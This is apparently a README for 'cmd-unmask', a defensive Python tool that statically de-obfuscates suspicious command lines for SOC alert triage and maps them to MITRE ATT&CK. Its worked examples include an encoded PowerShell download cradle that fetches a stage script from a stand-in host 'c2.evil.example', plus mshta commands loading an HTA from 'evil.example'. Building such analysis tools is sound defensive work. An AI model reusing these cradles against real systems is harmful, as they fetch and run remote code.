<div align="center">

```text
                     __                                       __   
  _________ ___  ___/ /     __  ______  ____ ___  ____ ______/ /__ 
 / ___/ __ `__ \/ __  /_____/ / / / __ \/ __ `__ \/ __ `/ ___/ //_/ 
/ /__/ / / / / / /_/ /_____/ /_/ / / / / / / / / / /_/ (__  ) ,<    
\___/_/ /_/ /_/\__,_/      \__,_/_/ /_/_/ /_/ /_/\__,_/____/_/|_|   
```

### Static Command-Line De-Obfuscation & Behavioral Triage Tracer Script

*"Stop alt-tabbing to CyberChef for every obfuscated SIEM offense. Peel multi-layered command lines, extract defanged IOCs, and generate ready-to-paste SOC ticket notes in milliseconds—100% static, offline, and zero-dependency."*

[**Why cmd-unmask?**](#-why-cmd-unmask) • [**30-Second Quickstart**](#-30-second-quickstart) • [**Live Terminal Output**](#-live-terminal-output) • [**4-Pillar Architecture**](#-architecture--design-decisions) • [**SIEM Batch Triage**](#-batch-siem--edr-ingestion)

</div>

---

## ⚡ The 5-Second Pitch (Before vs. After)

**1. What lands in your QRadar / Wazuh / SentinelOne Offense:**
```powershell
p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
```

**2. What `cmd-unmask -p --copy-note` puts on your clipboard in 12ms:**
```text
[SOC TRIAGE NOTE - clipboard]
Verdict       : CRITICAL (Risk Score: 100/100)
Obfuscation   : Shell Normalizer -> Base64 UTF-16LE Decoded
Raw Command   : p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB... (276 chars total)
Unmasked Cmd  :
  powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
Extracted IOCs:
  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
  - [DOMAIN] c2[.]evil[.]example
MITRE ATT&CK  :
  - T1027.010 : Command Obfuscation (Shell/Expression Layer) (Defense Evasion)
  - T1140 : Deobfuscate/Decode Payload Layer (Defense Evasion)
  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
```

---

## 🎯 Why `cmd-unmask`?

During live L1/L2 alert triage, every minute spent manually baking CyberChef recipes or fixing broken Base64 padding slows down containment. Existing workflows force trade-offs between speed, safety, and accuracy:

| Capability | `cmd-unmask` | Manual CyberChef Tabs | Naive Regex Scripts | Dynamic Sandbox / `eval` |
| :--- | :--- | :--- | :--- | :--- |
| **Multi-Layer Interleaving** (`^` + `-enc` + `Gzip` + `-f`) | **Automatic BFS DAG** | Manual recipe chaining | Fails on nested layers | Unpacks only if executed |
| **Data Sovereignty / Air-Gap Safe** | **100% Offline CLI** | Browser tab / copy-paste risk | Local | Often cloud-hosted |
| **Execution Safety on Analyst Host** | **100% Static (Zero `eval`)** | Safe | Safe | **High risk if run locally** |
| **Workstation EDR CLI Block Bypass** | **Native `-p` Clipboard Mode** | N/A | Blocked by local AMSI/EDR | Blocked by local AMSI/EDR |
| **`.NET` Namespace False-Positive Suppression** | **Contextual IOC Gate** | Extracts `[Net.WebClient]` as domain | Massive False Positives | N/A |
| **SOC Offense Ticket Formatting** | **Instant (`--copy-note`)** | Manual typing & defanging | Raw text dump | Heavy PDF/JSON report |
| **Runtime Dependencies** | **Zero (Python 3 Stdlib)** | Browser required | Varies (`pip` bloat) | Heavy VM / Docker stack |

### What It Peels Automatically
- **Shell-Level DOSfuscation**: `cmd.exe` caret (`^`) insertion, empty quote pairs (`""`), `%ComSpec%` and environment variable substring slicing (`%var:~offset,len%`), and PowerShell backtick (`` ` ``) noise outside single-quoted literals.
- **Static Expression Obfuscation**: PowerShell format operators (`"{1}{0}" -f`), `[char]` / `[char[]]` casting, `-join` / `[string]::Join`, case-sensitive `.Replace()` vs. case-insensitive `-replace`, string reversal, and Bash ANSI-C quoting (`$'\x63\x75\x72\x6c'`) or `${var//a/b}` parameter expansion.
- **Multi-Layer Payload Encoding & Compression**: Unpadded or URL-safe Base64 (`-enc`), UTF-16LE vs. UTF-8 byte streams, `IO.Compression.GzipStream` / `DeflateStream` payloads (with 32MB zip-bomb protection), hex blobs, URL percent-encoding, `fromCharCode` arrays, and single-byte XOR loops.

---

## 🚀 30-Second Quickstart

`cmd-unmask` requires Python `>= 3.11` and installs with **zero third-party packages**:

```bash
git clone https://github.com/VelkaRepo/cmd-unmask.git
cd cmd-unmask
pip install -e .
```

### 1. Clipboard & Interactive Mode (Bypasses Local EDR CLI Blocks)
Passing raw malicious stagers directly on an analyst workstation command line (`-c "powershell -enc ..."`) often triggers local Windows Defender / SentinelOne CLI blocks (`Access is denied`). Copy the alert command from your SIEM and run:

```bash
# Read obfuscated command from OS clipboard, print full analysis, and copy the SOC Ticket Note back to clipboard
cmd-unmask -p --copy-note

# Or launch interactive mode (paste at prompt, or press Enter to read from clipboard)
cmd-unmask
```

### 2. Single Command & Standard Input
```bash
# Analyze a single command string (defaults to --format pretty)
cmd-unmask -c "powershell -c ('{1}{0}' -f 'Client','Net.Web')"

# Disable ANSI color codes or emit raw (undefanged) IOCs
cmd-unmask -c "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" --no-color --no-defang

# Pipe from stdin and emit structured JSON
echo "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" | cmd-unmask --format json
```

---

## 🖥️ Live Terminal Output

By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy:

```text
╔════════════════════════════════════════════════════════════════════╗
║ Triage Verdict [cli] | Severity: CRITICAL (100/100)                ║
╚════════════════════════════════════════════════════════════════════╝

[1] UNMASKING TIMELINE (LAYER-BY-LAYER)
  ├─► Step 0 [Raw Input]
  │   p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
  ├─► Step 1 [Shell Normalizer]
  │   powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUAOgA4ADAAOAAwAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==
  └─► Step 2 [Base64 UTF-16LE Decoded] [FINAL UNMASKED PAYLOAD]
      powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')

[2] EXTRACTED IOCs (DEFANGED)
  ├─► [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 2 [Base64 UTF-16LE Decoded])
  └─► [domain] c2[.]evil[.]example (from Step 2 [Base64 UTF-16LE Decoded])

[3] WHY THIS WAS FLAGGED (MITRE ATT&CK & EVIDENCE)
  ├─► T1027.010 (Defense Evasion) - Command Obfuscation (Shell/Expression Layer): Applied Shell Normalizer (Step 1 [Shell Normalizer])
  ├─► T1140 (Defense Evasion) - Deobfuscate/Decode Payload Layer: Applied Base64 UTF-16LE Decoded (Step 2 [Base64 UTF-16LE Decoded])
  ├─► T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
  └─► T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 2 [Base64 UTF-16LE Decoded])

[4] READY-TO-PASTE SOC TICKET NOTE
────────────────────────────────────────────────────────────────────
[SOC TRIAGE NOTE - cli]
Verdict       : CRITICAL (Risk Score: 100/100)
Obfuscation   : Shell Normalizer -> Base64 UTF-16LE Decoded
Raw Command   : p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB... (276 chars total)
Unmasked Cmd  :
  powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
Extracted IOCs:
  - [URL] hxxp://c2[.]evil[.]example[:]8080/stage.ps1
  - [DOMAIN] c2[.]evil[.]example
MITRE ATT&CK  :
  - T1027.010 : Command Obfuscation (Shell/Expression Layer) (Defense Evasion)
  - T1140 : Deobfuscate/Decode Payload Layer (Defense Evasion)
  - T1059.001 : PowerShell Suspicious Execution / Cradle (Execution)
  - T1105 : Ingress Tool Transfer / Remote Download Cradle (Command and Control)
────────────────────────────────────────────────────────────────────
```

---

## 📦 Batch SIEM & EDR Ingestion

`cmd-unmask` natively ingests raw line-delimited text files, JSON arrays, and JSONL exports from **QRadar, Wazuh, SentinelOne, FortiGate, and ArcSight**. It auto-detects standard command-line fields (`CommandLine`, `command_line`, `cmd`, `process.command_line`, `data.win.eventdata.commandLine`, `payload`), unescapes outer JSON wrapper quotes (`\"` -> `"`), and isolates malformed records so a corrupt log line never crashes a batch run:

```bash
# Batch-triage a JSONL export from Wazuh or SentinelOne and emit JSONL verdicts
cmd-unmask -f alerts.jsonl --format jsonl > triaged_alerts.jsonl

# Specify a custom JSON key and enforce a CI/SOAR severity exit gate (exit code 2 on HIGH or CRITICAL)
cmd-unmask -f qradar_offense.json --field CustomProcessCmd --fail-on HIGH
```

---

## 🏗️ Architecture & Design Decisions

```text
  [ Raw CLI / OS Clipboard (-p) / SIEM Batch File (JSON, JSONL, Text) ]
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 1: Ingestion Pipeline & Quote-Aware Two-Pass Shell Normalizer  │
│  • Auto-detects SIEM keys (CommandLine, process.command_line, etc.)   │
│  • Unescapes outer JSON/SIEM quotes (\" -> ")                       │
│  • Pass 1 (cmd.exe): Strips ^ & "", resolves %ComSpec% & %var:~x,y%  │
│  • Pass 2 (PowerShell): Strips noise backticks while preserving `n/`t │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 2: Interleaved Unpacking DAG & Case-Aware Expression Resolver  │
│  • Bounded BFS DAG (max_depth=10, max_nodes=32, SHA-256 deduplicated) │
│  • Interleaves per-node: Normalizer -> Expression Resolver -> Carvers │
│  • Decoders: Base64 (UTF-16LE/UTF-8, URL-safe, unpadded), Gzip,       │
│    Deflate (32MB chunked ceiling), Hex, URL, CharCode, & Gated XOR    │
│  • Splices decoded spans into Reconstructed Commands & ranks leaves   │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 3: Full-DAG Contextual IOC Extractor & Automatic Defanging     │
│  • Harvests IOCs across EVERY Payload Node (preserving intermediate   │
│    stager domains/IPs that disappear in final in-memory cradles)      │
│  • Extracts URLs, Domains (including URL hostnames), IPv4/IPv6,       │
│    Windows/POSIX file paths, Registry keys, Named Pipes, MD5/SHA      │
│  • Suppresses .NET classes ([Net.WebClient]) & script filenames       │
└───────────────────────────────────┬───────────────────────────────────┘
                                    │
                                    ▼
┌───────────────────────────────────────────────────────────────────────┐
│ Pillar 4: MITRE ATT&CK Behavioral Classifier & Operator Renderer      │
│  • Dual-stage scoring: Base Behavioral Intent + Obfuscation Bonus     │
│  • Detects LOLBins (certutil, mshta, rundll32, regsvr32, wmic, bits), │
│    AMSI/ETW tampering, credential dumping (lsass/ntds/sam), cradles   │
│  • Renders ANSI Pretty UI, Ready-to-Paste SOC Ticket Note, MD, JSONL  │
└───────────────────────────────────────────────────────────────────────┘
```

### Domain Glossary & Architecture Decision Records (ADRs)
- **Ubiquitous Language**: [`GLOSSARY.md`](GLOSSARY.md) defines canonical domain terms (`Tracer Script`, `Ingestion Pipeline`, `Unpacking DAG`, `Payload Node`, `Detection Rigidity`, `Primary Unmasked Payload`, `Defanged IOC`, `Triage Verdict`).
- **Architecture Decision Records (`docs/adr/`)**:
  - [ADR-0001: Static Standard-Library-Only Analysis with Zero Dynamic Execution](docs/adr/0001-static-stdlib-only-analysis.md)
  - [ADR-0002: Quote-Aware Two-Pass Shell Normalizer](docs/adr/0002-quote-aware-two-pass-shell-normalizer.md)
  - [ADR-0003: Bounded Unpacking DAG with Pruning Gates and Padding-Tolerant Base64](docs/adr/0003-bounded-unpacking-dag-and-pruning-gates.md)
  - [ADR-0004: Case-Aware Bottom-Up Static Expression Resolver](docs/adr/0004-case-aware-static-expression-resolver.md)
  - [ADR-0005: Full-DAG IOC Harvesting and Dual-Stage Behavioral Intent Scoring](docs/adr/0005-full-dag-ioc-harvesting-and-intent-scoring.md)
  - [ADR-0006: Interleaved Node Processing Cycle and Deterministic Primary Leaf Ranking](docs/adr/0006-interleaved-node-processing-and-leaf-ranking.md)
  - [ADR-0007: Contextual IOC Validation to Suppress Namespace and Hex-Blob False Positives](docs/adr/0007-contextual-ioc-false-positive-suppression.md)
  - [ADR-0008: Operator UX, Win32 Clipboard Ingestion, and Layer-by-Layer Timeline Rendering](docs/adr/0008-operator-ux-clipboard-ingestion-and-timeline-rendering.md)

---

## 🧪 Verification & Test Suite

Run the full unit and integration test suite (42 tests covering DOSfuscation, expression folding, multi-layer DAG unpacking, zip-bomb ceilings, IOC false-positive suppression, MITRE classification, and CLI UX) via Python's built-in `unittest` discovery:

```bash
python -m unittest discover -s tests -v
```
